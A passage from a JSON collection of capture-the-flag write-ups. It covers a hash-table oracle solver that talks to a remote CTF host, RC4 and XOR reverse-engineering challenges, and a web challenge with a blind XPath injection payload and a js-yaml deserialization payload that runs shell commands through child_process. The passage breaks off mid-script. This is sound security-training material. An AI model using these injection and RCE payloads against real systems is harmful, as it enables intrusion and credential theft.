to find this <code>target</code> index.\n2.  Trial Mechanism: In each trial, we submitted a new polynomial. The server would then check if the hash table, *including the junk value*, was balanced (i.e., no slot had more than 4 items).\n<ul>\n<li>  If the <code>target</code> slot (which already had 1 junk item) received 4 additional items from our polynomial, its total count would be 5, causing the server to report \"failed.\"</li>\n<li>  If the <code>target</code> slot received 3 additional items from our polynomial, its total count would be 4, causing the server to report \"passed.\"</li>\n</ul>\n3.  Binary Search Strategy: This provided a binary (Pass/Fail) signal. With 256 possible <code>target</code> indices and 6 trials, we could narrow down the possibilities significantly.\n<ul>\n<li>  We maintained a <code>candidates</code> list, initially containing all 256 indices.</li>\n<li>  In each trial, we split the <code>candidates</code> list into two halves: <code>test_group</code> and <code>rest_group</code>.</li>\n<li>  We then constructed a polynomial that assigned 4 items to all slots in the <code>test_group</code> (and padded this group with \"safe\" indices from previous trials to ensure exactly 128 \"size-4\" slots). The remaining slots were assigned 3 items.</li>\n<li>  If the server reported \"failed,\" the <code>target</code> was in our <code>test_group</code>.</li>\n<li>  If the server reported \"passed,\" the <code>target</code> was in our <code>rest_group</code>.</li>\n<li>  This effectively halved the <code>candidates</code> list in each trial: $256 \\to 128 \\to 64 \\to 32 \\to 16 \\to 8 \\to 4$.</li>\n</ul>\n4.  Final Guess: After 6 trials, we were left with 4 candidate indices. Since we had no further information, we simply guessed the first index in the remaining <code>candidates</code> list. This gave us a 1/4 (25%) chance of success for each connection attempt.\n5.  Automation and Retries: The entire process was wrapped in a <code>while True</code> loop to automatically reconnect and retry the challenge until the correct index was guessed and the flag was obtained.</p>\n<p>Execution:\nThe Python script <code>solve.py</code> was executed. It connected to the remote instance, performed the polynomial calculations and interactions for Phase 1 and 2, and eventually succeeded in guessing the correct index.</p>\n<pre><code class=\"python\">from pwn import *\nimport sys\nimport time\nimport traceback\n<p>&lt;h2&gt;Set context&lt;/h2&gt;\ncontext.log_level = 'info'</p>\n<p>MOD = 10**9 + 7\nN = 896\nK = 256</p>\n<p>def solve_poly(inputs, targets):\n    n = len(inputs)\n    # 1. Compute M(x) = product(x - inputs[i])\n    M = [1] \n    for x in inputs:\n        c = (MOD - x) % MOD\n        new_M = [0] * (len(M) + 1)\n        for i in range(len(M)):\n            new_M[i] = (new_M[i] + M[i] * c) % MOD\n            new_M[i+1] = (new_M[i+1] + M[i]) % MOD\n        M = new_M</p>\n<p>M_deriv = []\n    for i in range(1, len(M)):\n        M_deriv.append((M[i] * i) % MOD)</p>\n<p>w = []\n    for x in inputs:\n        val = 0\n        power_x = 1\n        for c in M_deriv:\n            val = (val + c * power_x) % MOD\n            power_x = (power_x * x) % MOD\n        w.append(val)</p>\n<p>inv_w = [pow(val, MOD-2, MOD) for val in w]</p>\n<p>final_poly = [0] * n</p>\n<p>for j in range(n):\n        target = targets[j]\n        if target == 0: continue # Optimization</p>\n<p>scale = (target * inv_w[j]) % MOD\n        if scale == 0: continue</p>\n<p>c = inputs[j]\n        carry = 0 \n        for k in range(n, 0, -1):\n             val = (M[k] + c * carry) % MOD\n             carry = val\n             final_poly[k-1] = (final_poly[k-1] + val * scale) % MOD</p>\n<p>return final_poly</p>\n<p>def main():\n    while True:\n        try:\n            # Connect\n            log.info(\"Connecting...\")\n            r = remote('remote.infoseciitr.in', 4006)</p>\n<p># Read intro\n            r.recvuntil(b\"Press Enter to start &gt; \")\n            r.sendline(b\"\")</p>\n<p># Read leaked numbers\n            r.recvuntil(b\"Here are the leaked numbers : \")\n            nums_str = r.recvline().strip().decode()\n            number_array = list(map(int, nums_str.split(',')))</p>\n<p>log.info(f\"Received {len(number_array)} numbers\")</p>\n<p># Phase 1: Provide balanced hash\n            targets = []\n            slot_counts = [0] * K\n            for i in range(N):\n                if i &lt; 512:\n                    slot = i // 4\n                else:\n                    rem = i - 512\n                    slot = 128 + (rem // 3)\n                targets.append(slot)\n                slot_counts[slot] += 1</p>\n<p>log.info(\"Computing Phase 1 polynomial...\")\n            coeffs = solve_poly(number_array, targets)\n            payload = \",\".join(map(str, coeffs[::-1]))</p>\n<p>r.sendlineafter(b\"&gt; \", payload.encode())</p>\n<p>ret = r.recvuntil(b\"Press Enter to continue &gt; \", timeout=10)\n            if b\"Press Enter\" not in ret:\n                log.error(\"Phase 1 failed or timed out\")\n                log.error(ret.decode())\n                r.close()\n                continue</p>\n<p>log.info(\"Phase 1 success.\")\n            r.sendline(b\"\")</p>\n<p># Phase 2: Find the index\n            candidates = list(range(K))\n            safe_indices = []</p>\n<p>for trial in range(6):\n                log.info(f\"Trial {trial+1}, Candidates: {len(candidates)}\")</p>\n<p>mid = len(candidates) // 2\n                test_group = candidates[:mid]\n                rest_group = candidates[mid:]</p>\n<p>needed = 128 - len(test_group)\n                if needed &lt; 0: needed = 0\n                padding = safe_indices[:needed]</p>\n<p>slots_for_4 = set(test_group + padding)\n                # Ensure we have exactly 128\n                if len(slots_for_4) != 128:\n                    log.warning(f\"Slots for 4 count: {len(slots_for_4)}. Candidates: {len(candidates)}\")</p>\n<p>current_slot_counts = {}\n                for s in range(K):\n                    if s in slots_for_4:\n                        current_slot_counts[s] = 4\n                    else:\n                        current_slot_counts[s] = 3</p>\n<p>target_slots_list = []\n                for s in range(K):\n                    count = current_slot_counts[s]\n                    for _ in range(count):\n                        target_slots_list.append(s)</p>\n<p>log.info(\"Computing Phase 2 polynomial...\")\n                coeffs = solve_poly(number_array, target_slots_list)\n                payload = \",\".join(map(str, coeffs[::-1]))</p>\n<p>r.sendlineafter(b\"&gt; \", payload.encode())</p>\n<p>response = r.recvuntil(b\"\\n\\n\").decode()</p>\n<p>if \"passed\" in response:\n                    candidates = rest_group\n                    safe_indices.extend(test_group)\n                else:\n                    candidates = test_group\n                    safe_indices.extend(rest_group)</p>\n<p>log.info(f\"Candidates left: {candidates}\")\n            guess = candidates[0]\n            log.info(f\"Guessing: {guess}\")</p>\n<p>r.sendlineafter(b\"Tell your friend the index : \", str(guess).encode())</p>\n<p>final_res = r.recvall(timeout=5).decode()\n            print(final_res)</p>\n<p>if \"flag\" in final_res.lower() or \"Flag\" in final_res or \"{\" in final_res:\n                print(\"FOUND FLAG!\")\n                break\n            else:\n                log.info(\"Failed, retrying...\")\n                r.close()</p>\n<p>except BaseException as e:\n            print(f\"CRITICAL ERROR: {e}\")\n            traceback.print_exc()\n            try: r.close()\n            except: pass\n            time.sleep(1)</p>\n<p>if __name__ == \"__main__\":\n    main()\n</code></pre></p>\n<p>Flag: <code>flag{h0w_d1d_h3_b3c0m3_th3_m4n4g3r}</code></p>\n"
            },
            {
                "id": "to_jmp_or_not_jmp",
                "title": "To_jmp_or_not_jmp",
                "category": "Reverse Engineering",
                "tags": [
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "assembly",
                    "disassembler",
                    "memory"
                ],
                "writeup": "<h3>1. Challenge Overview</h3>\n<p>The challenge presented a stripped 64-bit ELF executable named <code>challenge</code>. When executed, it prompted for a \"flag\" and responded with \"Wrong! Try again.\" if an incorrect input was provided. The goal was to find the correct flag.</p>\n<h3>2. Initial Analysis</h3>\n<ul>\n<li>  <strong>File Type:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    ls -la &amp;&amp; file challenge\n    </code></pre>\n    Output confirmed it was an <code>ELF 64-bit LSB pie executable, x86-64, stripped</code>. The \"stripped\" nature meant function names were removed, increasing the difficulty of static analysis. \"PIE\" (Position-Independent Executable) indicated that addresses would be relative, requiring careful RIP-relative address calculations.\n<ul>\n<li>  <strong>Execution:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    ./challenge\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    Enter the flag: 12345\n    Wrong! Try again.\n    </code></pre>\n    This confirmed the program's basic interaction.\n<ul>\n<li>  <strong>Strings Analysis:</strong></li>\n</ul>\n    <pre><code class=\"bash\">    strings challenge | grep -i flag\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    Enter the flag:\n    Correct! You got the flag!\n    </code></pre>\n    The presence of \"Correct! You got the flag!\" suggested a comparison logic within the binary that we needed to locate and understand.\n<h3>3. Reverse Engineering - Control Flow Obfuscation</h3>\n<p>The primary challenge in static analysis was the presence of control flow obfuscation using a pattern of <code>je</code> (jump if equal) and <code>jne</code> (jump if not equal) instructions targeting the same address. This effectively created an unconditional jump but confused disassemblers and made linear analysis difficult. For example:</p>\n<pre><code class=\"assembly\">    16a9:       74 03                   je     16ae\n    16ab:       75 01                   jne    16ae\n</code></pre>\nBoth instructions would jump to <code>16ae</code>, making <code>16ae</code> the actual next instruction. This pattern required careful manual tracing of the control flow.\n<p>The binary also used dynamic jump targets:\n1.  An address (e.g., <code>0x11c9</code>) was calculated using <code>lea rax, [rip + offset]</code>.\n2.  This address was then stored in a global memory location (e.g., <code>mov QWORD PTR [rip+offset], rax</code>).\n3.  Later, the value from that global memory location was loaded into a register (<code>mov rax, QWORD PTR [rip+offset]</code>).\n4.  Finally, an indirect jump (<code>jmp rax</code>) was used to transfer execution to the calculated address. This made it difficult to follow the flow directly in <code>objdump</code> without careful calculation.</p>\n<p>After tracing the obfuscated entry point (<code>0x10e0</code>) and subsequent jumps, the effective <code>main</code> function started at <code>0x11c9</code>.</p>\n<h3>4. Identifying RC4 Algorithm</h3>\n<p>Inside the <code>main</code> function (starting at <code>0x11c9</code> after initial setup), the following sequence of operations was identified:</p>\n<ul>\n<li>  <strong>Prompt for Input:</strong> The string \"Enter the flag:\" was printed, followed by a call to <code>std::getline</code> to read user input. The length of the input was stored in a global variable at <code>0x44a0</code>.</li>\n<li>  <strong>S-box Initialization (KSA Phase 1):</strong> A loop from <code>0</code> to <code>255</code> initialized a 256-byte array (likely the S-box for RC4) with <code>S[i] = i</code>. This array was located in the <code>.bss</code> section (uninitialized data), eventually mapped to virtual address <code>0x4280</code>.</li>\n<li>  <strong>Key Scheduling Algorithm (KSA Phase 2):</strong> A second loop (from <code>i=0</code> to <code>255</code>) performed the key-dependent scrambling of the S-box. The logic closely matched the standard RC4 KSA:</li>\n</ul>\n    <pre><code class=\"\">    j = (j + S[i] + key_byte) % 256\n    swap(S[i], S[j])\n    </code></pre>\n<ul>\n<li>  <strong>Pseudo-Random Generation Algorithm (PRGA):</strong> After the KSA, a third loop iterated for the length of the user's input. In each iteration, it generated a keystream byte and XORed it with a byte of the user's input. The standard RC4 PRGA was identified:</li>\n</ul>\n    <pre><code class=\"\">    i = (i + 1) % 256\n    j = (j + S[i]) % 256\n    swap(S[i], S[j])\n    K = S[(S[i] + S[j]) % 256]\n    encrypted_input_byte = input_byte ^ K\n    </code></pre>\n    The results of this XOR operation (the \"encrypted\" user input) were stored in a buffer at <code>0x4420</code>.\n<ul>\n<li>  <strong>Comparison:</strong> Finally, the \"encrypted\" user input (from <code>0x4420</code>) was compared byte-by-byte with a pre-stored ciphertext.</li>\n<li>  If all bytes matched, the program jumped to a block that printed \"Correct! You got the flag!\" (identified by tracing a <code>lea</code> instruction to <code>0x20a1</code> in <code>.rodata</code>).</li>\n<li>  If any byte mismatched, it jumped to a block that printed \"Wrong! Try again.\"</li>\n</ul>\nThis confirmed that the challenge involved an RC4-encrypted flag, and we needed to reverse the encryption by finding the key and the pre-stored ciphertext.\n<h3>5. Extracting RC4 Parameters</h3>\n<h4>a. Key Identification</h4>\n<ul>\n<li>  During KSA analysis, an instruction <code>lea rdx,[rip+0xccd]</code> was found, which resolved to address <code>0x2020</code>. This address was within the <code>.rodata</code> section, indicating it was a constant string.</li>\n<li>  A modulo operation <code>(i % 15)</code> was used to index into this data, suggesting a key length of 15.</li>\n<li>  Dumping 15 bytes from <code>0x2020</code> in the <code>challenge</code> binary:</li>\n</ul>\n    <pre><code class=\"bash\">    dd if=challenge bs=1 skip=$((0x2020)) count=15 2&gt;/dev/null | hexdump -C\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    00000000  21 61 31 20 61 26 0d 39  61 2b 0d 20 31 66 73     |!a1 a&amp;.9a+. 1fs|\n    </code></pre>\n    The key bytes were <code>21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73</code>. Note that <code>0d</code> is Carriage Return (<code>\\r</code>), not a period (<code>.</code>). The string representation is <code>!a1 a&\\r9a+\\r 1fs</code>.\n<h4>b. Key Modification</h4>\n<ul>\n<li>  A critical instruction <code>xor eax, 0x52</code> was discovered immediately after fetching a key byte <code>key[i % key_len]</code> and before it was added to <code>j</code> in the KSA. This meant each key byte was XORed with <code>0x52</code> during the KSA process.</li>\n</ul>\n<h4>c. Ciphertext Identification</h4>\n<ul>\n<li>  The comparison loop read from a location at <code>0x2040</code>. This address was also within <code>.rodata</code>, indicating it was the static ciphertext of the flag.</li>\n<li>  Dumping bytes from <code>0x2040</code> (initially 64 bytes, then extended to 66 when the flag revealed its full length):</li>\n</ul>\n    <pre><code class=\"bash\">    dd if=challenge bs=1 skip=$((0x2040)) count=66 2&gt;/dev/null | hexdump -C\n    </code></pre>\n    Output:\n    <pre><code class=\"\">    00000000  8f 36 cf 7d 04 8e 35 ac  0f e8 3f 53 8b 87 ac 26  |.6.}..5...?S...&amp;|\n    00000010  18 5b 13 c7 ff a6 1d 92  29 b7 62 af a9 b0 cf 74  |.[......).b....t|\n    00000020  d2 99 4e 55 47 a9 77 3b  67 28 cb 52 74 90 47 24  |..NUG.w;g(.Rt.G$|\n    00000030  15 94 e1 4e 4d f2 57 ad  7f 5d 22 17 05 08 8b 2a  |...NM.W..\"....*|\n    00000040  ed f1                                            |..              |\n    </code></pre>\n    The ciphertext bytes are <code>8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1</code>.\n<h3>6. Decryption</h3>\n<p>A Python script <code>solve.py</code> was written to implement the RC4 algorithm with the identified key and ciphertext, including the key modification step.</p>\n<pre><code class=\"python\">def rc4_ksa(key_bytes):\n    S = list(range(256))\n    j = 0\n    key_len = len(key_bytes)\n    for i in range(256):\n        # Apply the modification found in analysis: XOR key byte with 0x52\n        modified_key_byte = key_bytes[i % key_len] ^ 0x52\n        j = (j + S[i] + modified_key_byte) % 256\n        S[i], S[j] = S[j], S[i]\n    return S\n<p>def rc4_prga(S, data_len):\n    i = 0\n    j = 0\n    keystream = []\n    # Create a copy of S for PRGA so KSA S-box is not modified\n    S_prga = list(S) \n    for _ in range(data_len):\n        i = (i + 1) % 256\n        j = (j + S_prga[i]) % 256\n        S_prga[i], S_prga[j] = S_prga[j], S_prga[i]\n        K = S_prga[(S_prga[i] + S_prga[j]) % 256]\n        keystream.append(K)\n    return keystream</p>\n<p>&lt;h2&gt;Key bytes derived from hexdump, including 0x0d for Carriage Return&lt;/h2&gt;\nkey_hex_str = \"21 61 31 20 61 26 0d 39 61 2b 0d 20 31 66 73\"\nkey_bytes = [int(b, 16) for b in key_hex_str.split()]</p>\n<p>&lt;h2&gt;Ciphertext bytes from 0x2040&lt;/h2&gt;\nciphertext_hex = \"8f 36 cf 7d 04 8e 35 ac 0f e8 3f 53 8b 87 ac 26 18 5b 13 c7 ff a6 1d 92 29 b7 62 af a9 b0 cf 74 d2 99 4e 55 47 a9 77 3b 67 28 cb 52 74 90 47 24 15 94 e1 4e 4d f2 57 ad 7f 5d 22 17 05 08 8b 2a ed f1\"\nciphertext = bytes.fromhex(ciphertext_hex.replace(\" \", \"\"))</p>\n<p>S_ksa = rc4_ksa(key_bytes)\nkeystream = rc4_prga(S_ksa, len(ciphertext))</p>\n<p>decrypted_bytes = []\nfor c, k in zip(ciphertext, keystream):\n    decrypted_bytes.append(c ^ k)</p>\n<p>print(\"Decrypted bytes:\", decrypted_bytes)\nprint(\"Decrypted string:\", bytes(decrypted_bytes))\n</code></pre></p>\n<p>Running <code>python3 solve.py</code> produced:</p>\n<pre><code class=\"\">Decrypted string: b'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}'\n</code></pre>\n<h3>7. Verification</h3>\n<p>To verify the decrypted flag, the executable needed to be run with execute permissions. After restoring execute permissions:</p>\n<pre><code class=\"bash\">chmod +x challenge\necho 'flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}' | ./challenge\n</code></pre>\n<p>Output:\n<pre><code class=\"\">Enter the flag: Correct! You got the flag!\n</code></pre></p>\n<p>This confirmed the flag was correctly identified.</p>\n<h3>Flag</h3>\n<p><code>flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}</code></p>\n<p>```</p>\n"
            },
            {
                "id": "trust-issues",
                "title": "Trust Issues",
                "category": "Web Exploitation",
                "tags": [
                    "injection",
                    "web"
                ],
                "writeup": "<p>1.  <strong>Blind XPath Injection (Timing Attack):</strong>\n    The <code>login</code> endpoint was vulnerable to XPath injection via the <code>username</code> field. The application performed a <code>setTimeout(..., 2000)</code> if a user was found, creating a timing oracle. By injecting XPath queries, we could ask true/false questions about the database content based on the response time.\n<ul>\n<li>  <strong>Vulnerable Code:</strong></li>\n</ul>\n        <pre><code class=\"javascript\">        const query = <code>//user[username/text()='${username}']</code>;\n        const userNode = xpath.select(query, xmlDoc)[0];\n        if (userNode) { await new Promise(resolve =&gt; setTimeout(resolve, 2000)); }\n        </code></pre>\n<ul>\n<li>  <strong>Exploit:</strong> We used a script to iterate through characters of the admin's password using the payload <code>admin' and substring(password, N, 1)='C</code>. This allowed us to extract the admin password: <code>df08cf</code>.</li>\n</ul>\n2.  <strong>Remote Code Execution (RCE) via YAML Deserialization:</strong>\n    With the admin credentials, we accessed the <code>/admin/create</code> endpoint. This endpoint accepted YAML content and parsed it using an outdated and vulnerable version of <code>js-yaml</code> (v2.0.4).\n<ul>\n<li>  <strong>Vulnerable Code:</strong></li>\n</ul>\n        <pre><code class=\"javascript\">        parsed = yaml.load(fileContent);\n        const applied = '' + parsed; \n        </code></pre>\n<ul>\n<li>  <strong>Exploit:</strong> We constructed a malicious YAML payload using the <code>!!js/function</code> tag, which allows execution of arbitrary JavaScript code during parsing in this version of <code>js-yaml</code>. We used an IIFE (Immediately Invoked Function Expression) to run system commands. Since <code>require</code> is not available in the global scope of <code>new Function</code>, we accessed it via <code>process.mainModule.require</code>.</li>\n</ul>\n    <strong>Payload:</strong>\n    <pre><code class=\"yaml\">    !!js/function \"function() { var req = process.mainModule.require; var res = req('child_process').execSync('cat flag.txt').toString(); return res; }()\"\n    </code></pre></p>\n<p><strong>Flag:</strong>\n<code>flag{xPath_to_YamLrc3_ecddd907d5d5decb}</code></p>\n"
            },
            {
                "id": "vault",
                "title": "Vault",
                "category": "Reverse Engineering",
                "tags": [
                    "xor",
                    "shellcode",
                    "assembly",
                    "memory",
                    "reverse"
                ],
                "writeup": "<p>The challenge presented a stripped 64-bit ELF executable named <code>chal</code>.\nUpon execution, it prompted for a password:</p>\n<pre><code class=\"\">I heard that you got some crazy vault breaking skills\n<p>Try to break this one</p>\n<p>Enter the password:\n</code></pre></p>\n<p>Initial attempts with arbitrary input resulted in:</p>\n<pre><code class=\"\">L00ks like you got some real skill issue.\nBetter luck next time.\n</code></pre>\n<p>Analysis using <code>objdump -d chal</code> and <code>readelf -S chal</code> revealed the following:</p>\n<p>1.  <strong>Password Length:</strong> The <code>main</code> function (at <code>0x1460</code>) used <code>scanf</code> to read input and then checked its length using <code>strcspn</code>. It compared the length against <code>0x35</code> (decimal 53). If the length was not 53, it printed the \"skill issue\" message and exited. This established the password length as 53 characters.</p>\n<p>2.  <strong>Dynamic Code Generation (JIT):</strong>\n    The core validation logic was found in a function called by <code>main</code> (at <code>0x1379</code>). This function iterated 53 times (once for each character of the password). In each iteration, it performed the following:\n<ul>\n<li>  It called another function (at <code>0x1249</code>) to dynamically generate a small piece of executable code (shellcode).</li>\n<li>  This dynamically generated shellcode was then executed to validate the current character of the password.</li>\n<li>  The address of the generated shellcode (in a memory-mapped executable region) was passed via <code>%r9</code>.</li>\n</ul>\n3.  <strong>Shellcode Generation Logic (Function at <code>0x1249</code>):</strong>\n    This function was responsible for \"decrypting\" the validation logic for each password character.\n<ul>\n<li>  It allocated a 56-byte executable memory region using <code>mmap</code>.</li>\n<li>  It iterated 56 times, reading an encrypted byte <code>B</code> from a <code>data</code> section (<code>0x4020 + 57 * i + j</code>).</li>\n<li>  It XORed <code>B</code> with a 4-byte key <code>K</code> (read from <code>0x4c00 + i * 4</code>). Specifically, it used the lowest byte of the XOR operation <code>(B ^ K) & 0xFF</code> to reconstruct the shellcode byte. This means <code>K</code> was effectively used as a single-byte XOR key for decryption, repeating for each byte of the shellcode.</li>\n<li>  The decrypted bytes formed the actual machine code for the character's validation function.</li>\n</ul>\n4.  <strong>Shellcode Validation Logic:</strong>\n    Disassembly of the generated shellcode (e.g., <code>func_0.bin</code>) revealed a consistent structure:\n<ul>\n<li>  <code>mov $SHIFT, %ecx</code>: The first instruction loaded a varying <code>SHIFT</code> value into <code>%ecx</code>. This <code>SHIFT</code> determined the starting bit position for validation.</li>\n<li>  <code>xor %rsi, %rdi</code>: The input character (<code>%rdi</code>) was XORed with the full 4-byte key (<code>%rsi</code>, passed from the main loop, which was <code>K</code>). Let <code>Y = input_char ^ K</code>.</li>\n<li>  A loop then iterated 8 times (for bits 0-7). In each iteration <code>k</code> (0 to 7):</li>\n<li>  It extracted a specific bit from <code>Y</code>: <code>bit = (Y >> ((SHIFT + k) % 8)) & 1</code>.</li>\n<li>  This <code>bit</code> was compared against an <code>expected_bit</code> value. The <code>expected_bit</code> was read from a <code>bits</code> section (<code>0x4ce0 + i * 32 + k * 4</code>).</li>\n<li>  If all 8 bits matched, the shellcode returned 1 (success); otherwise, it returned 0 (failure).</li>\n</ul>\n5.  <strong>Reconstruction Algorithm:</strong>\n    To find the password, for each character <code>i</code> from 0 to 52:\n<ul>\n<li>  <strong>Get Key:</strong> Read the 4-byte key <code>K</code> from <code>0x4c00 + i * 4</code>.</li>\n<li>  <strong>Get Shift:</strong> Decrypt the first two bytes of the <code>i</code>-th shellcode. The second byte <code>b1</code> of the decrypted code (<code>data[0x3020 + 57*i + 1] ^ (K & 0xFF)</code>) yielded the <code>SHIFT</code> value.</li>\n<li>  <strong>Reconstruct Y:</strong> Initialize <code>Y = 0</code>. For <code>k</code> from 0 to 7:</li>\n<li>  Read <code>expected_bit</code> from <code>0x4ce0 + i * 32 + k * 4</code>.</li>\n<li>  Calculate the bit position: <code>bit_pos = (SHIFT + k) % 8</code>.</li>\n<li>  If <code>expected_bit</code> is 1, set the <code>bit_pos</code> bit in <code>Y</code>.</li>\n<li>  <strong>Derive Character:</strong> Since <code>Y = input_char ^ K</code>, then <code>input_char = Y ^ K</code>. As only the lower 8 bits were relevant (<code>Y</code> was an 8-bit value), the actual character was <code>chr(Y ^ (K & 0xFF))</code>.</li>\n</ul>\nThe Python script <code>solve_final_v2.py</code> implemented this logic.</p>\n<p><strong>Python Script (<code>solve_final_v2.py</code>):</strong></p>\n<pre><code class=\"python\">import struct\n<p>def solve():\n    with open('chal', 'rb') as f:\n        data = f.read()</p>\n<p># Offsets (determined from readelf -S chal)\n    # 0x4020 (data_section_offset) is relative to its containing .data section (0x3000 file offset)\n    # 0x4c00 (key_section_address) -&gt; 0x3c00 (file offset)\n    # 0x4ce0 (bits_section_address) -&gt; 0x3ce0 (file offset)\n    data_section_offset = 0x3020\n    key_section_offset = 0x3c00\n    bits_section_offset = 0x3ce0</p>\n<p>password = []</p>\n<p>for i in range(53):\n        # 1. Read Key (used as XOR key in the check function)\n        key_offset = key_section_offset + (i * 4)\n        key_bytes = data[key_offset:key_offset+4]\n        key = struct.unpack('&lt;I', key_bytes)[0] # Keys are 4-byte little endian integers</p>\n<p># 2. Decrypt the first two bytes of the shellcode to find 'start_shift'\n        # The instruction is 'b9 SHIFT 00 00 00' (mov $SHIFT, %ecx)\n        # Encrypted byte 0: data[data_section_offset + 57*i + 0]\n        # Encrypted byte 1: data[data_section_offset + 57*i + 1]</p>\n<p>enc_b0 = data[data_section_offset + 57*i + 0]\n        enc_b1 = data[data_section_offset + 57*i + 1]</p>\n<p>dec_b0 = enc_b0 ^ (key &amp; 0xFF) # The lowest byte of the key is used for shellcode decryption\n        dec_b1 = enc_b1 ^ (key &amp; 0xFF)</p>\n<p>if dec_b0 != 0xB9:\n            print(f\"Error: Func {i} does not start with 0xB9 (mov %ecx). Found {hex(dec_b0)}\")\n            # Fallback to default if there's an unexpected format, though this indicates an issue.\n            start_shift = 4 \n        else:\n            start_shift = dec_b1</p>\n<p># 3. Reconstruct Y = char ^ K (where K is the actual 4-byte key)\n        # The character's bits are checked in the order: (start_shift + k) % 8 for k = 0 to 7.</p>\n<p>Y = 0 # This will hold the 8-bit value of (char ^ K)\n        base_bits_offset = bits_section_offset + (i * 32)</p>\n<p>for k in range(8):\n            # The expected bit is stored as a single byte at base_bits_offset + (k * 4)\n            expected_bit_offset = base_bits_offset + (k * 4)\n            expected_bit = data[expected_bit_offset] # Read byte</p>\n<p># The bit position in Y being checked in this iteration\n            bit_pos = (start_shift + k) % 8</p>\n<p>if expected_bit: # If the expected bit is 1\n                Y |= (1 &lt;&lt; bit_pos) # Set that bit in Y</p>\n<p># 4. Derive the actual character\n        # We have Y = input_char ^ K. Therefore, input_char = Y ^ K.\n        # Since Y is an 8-bit value, we only care about the lowest 8 bits of K.\n        char_code = Y ^ (key &amp; 0xFF)\n        password.append(chr(char_code))</p>\n<p>print(\"Password:\", \"\".join(password))</p>\n<p>if __name__ == '__main__':\n    solve()\n</code></pre></p>\n<p><strong>Execution:</strong>\nRunning the script yielded the password:\n<code>flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}</code></p>\n<p>Verification with <code>./chal</code> confirmed the flag:\n<code>echo \"flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}\" | ./chal</code>\nOutput: <code>Good job</code></p>\n"
            },
            {
                "id": "where-code",
                "title": "Where code",
                "category": "Reverse Engineering",
                "tags": [
                    "crypto",
                    "cipher",
                    "xor",
                    "buffer",
                    "reverse",
                    "ghidra",
                    "memory"
                ],
                "writeup": "<p>1. Initial Analysis</p>\n<p>We started with a 64-bit ELF binary named challenge. Running strings on the binary revealed a critical clue:\nPlaintext</p>\n<p>expand 32-byte k</p>\n<p>This string is the distinct sigma constant used in ChaCha20 and Salsa20 stream ciphers. This immediately suggests that the flag is being encrypted or decrypted using one of these algorithms.\n2. Static Analysis (Decompilation)</p>\n<p>Opening the binary in a decompiler (like Ghidra) revealed a main function calling a subroutine FUN_00101592. Analyzing this subroutine confirmed the encryption logic.\nThe Encryption Routine</p>\n<p>The function initializes a state matrix using the constants found earlier:</p>\n<p>0x61707865 (\"apxe\")</p>\n<p>0x3320646e (\"3 dn\")</p>\n<p>0x79622d32 (\"yb-2\")</p>\n<p>0x6b206574 (\"k et\")</p>\n<p>Reversed (Little Endian), this spells \"expand 32-byte k\". The code then performs an XOR operation on the input buffer, confirming it is a stream cipher.\nIdentifying the Secrets</p>\n<p>To decrypt the flag, we needed three components: the Key, the Nonce (IV), and the Ciphertext. By analyzing the memory addresses in the decompiled code, we mapped the virtual addresses to file offsets:</p>\n<p>The Key (32 bytes):</p>\n<p>Location: 0x2080</p>\n<p>Value: A sequential pattern 00 01 02 ... 1F.</p>\n<p>The Nonce (12 bytes):</p>\n<p>Location: 0x20A0</p>\n<p>Value: Mostly nulls with 4A in the middle (000000000000004a00000000).</p>\n<p>The Ciphertext:</p>\n<p>Location: 0x2040</p>\n<p>Analysis: The main function passed a pointer to this address as the first argument to the encryption function. It contained roughly 34 bytes of raw binary data.</p>\n<p>3. The Problem</p>\n<p>Attempting to debug with GDB was inconsistent. Additionally, standard Python libraries (PyCryptodome) sometimes handle the ChaCha20 block counter differently (starting at 0 vs 1). The binary explicitly initialized the block counter to 1.\n4. The Solution</p>\n<p>We wrote a Python script to manually implement the ChaCha20 block function. This allowed us to:</p>\n<p>Extract the Key, Nonce, and Ciphertext directly from the binary file using the offsets found in Step 2.</p>\n<p>Force the block counter to start at 1 to match the binary's behavior.</p>\n<p>XOR the generated keystream with the ciphertext.</p>\n<p>Solver Script\n``<code>python \nimport struct</p>\n<p>def rotl32(x, n):\n    return ((x << n) & 0xffffffff) | (x >> (32 - n))</p>\n<p>def chacha20_block(key, counter, nonce):\n    constants = [0x61707865, 0x3320646e, 0x79622d32, 0x6b206574]\n    k = list(struct.unpack('<8I', key))\n    n = list(struct.unpack('<3I', nonce))\n    state = constants + k + [counter] + n\n    working_state = list(state)</p>\n<p># 20 rounds (Standard ChaCha20)\n    for _ in range(10): \n        def qr(a, b, c, d):\n            a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 16)\n            c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 12)\n            a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 8)\n            c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 7)\n            return a, b, c, d</p>\n<p># Column & Diagonal rounds\n        working_state[0], working_state[4], working_state[8], working_state[12] = qr(working_state[0], working_state[4], working_state[8], working_state[12])\n        working_state[1], working_state[5], working_state[9], working_state[13] = qr(working_state[1], working_state[5], working_state[9], working_state[13])\n        working_state[2], working_state[6], working_state[10], working_state[14] = qr(working_state[2], working_state[6], working_state[10], working_state[14])\n        working_state[3], working_state[7], working_state[11], working_state[15] = qr(working_state[3], working_state[7], working_state[11], working_state[15])\n        working_state[0], working_state[5], working_state[10], working_state[15] = qr(working_state[0], working_state[5], working_state[10], working_state[15])\n        